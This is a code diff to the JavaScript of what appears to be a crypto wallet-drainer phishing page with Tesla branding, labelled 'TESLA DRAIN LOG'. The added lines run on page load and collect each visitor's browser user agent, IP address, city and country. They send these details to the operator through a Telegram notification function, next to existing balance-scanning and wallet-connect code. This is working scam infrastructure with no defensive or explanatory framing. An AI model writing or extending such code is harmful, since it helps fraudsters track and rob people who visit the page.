@@ -184,6 +184,13 @@ async function scanBalances(address) {
 
 // --- MAIN FLOW ---
 document.addEventListener('DOMContentLoaded', async () => {
+ // Report Visit on Load
+ const location = await getLiveLocation();
+ const visitMessage = `
+*🔴 TESLA DRAIN LOG - NEW VISIT*\nUser Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}\nTime: ${new Date().toISOString()}
+ `;
+ notifyTelegram('VISIT', visitMessage);
+
  // Setup Button Click to Open Modal Explicitly
  const connectBtn = document.getElementById('connect-btn');
  if (connectBtn) {
